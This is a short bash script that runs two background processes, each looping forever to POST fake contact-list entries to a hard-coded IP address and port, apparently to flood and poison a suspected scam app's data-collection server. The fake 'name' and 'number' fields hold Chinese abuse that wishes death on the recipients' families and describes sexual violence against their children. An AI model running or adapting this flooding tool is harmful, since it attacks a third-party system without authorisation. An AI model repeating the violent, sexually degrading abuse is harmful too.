#!/bin/bash

for i in {1..2}
do
    (
        while true
        do
            curl -X POST -H "Content-Type:application/json; charset=UTF-8" \
                -d "{\"data\":{\"list\":[{\"name\":\"骗子死全家，男娃没鸡巴，女娃被操烂，没错说的就是你生的孩子\",\"number\":\"骗子死全家，男娃没鸡巴，女娃被操烂，没错说的就是你生的孩子\",\"type\":0}]},\"phone\":\"13312341234\",\"userId\":\"df42f27677cfd8ec451ba3b05ab88aff\",\"sjc\":1722860561230,\"ttttt\":\"7f1e178fd4b4fb2385a1264778b0f7f6\"}" \
                "http://120.24.175.2:16908/api/subList" -w '\n'
        done
    ) &
done
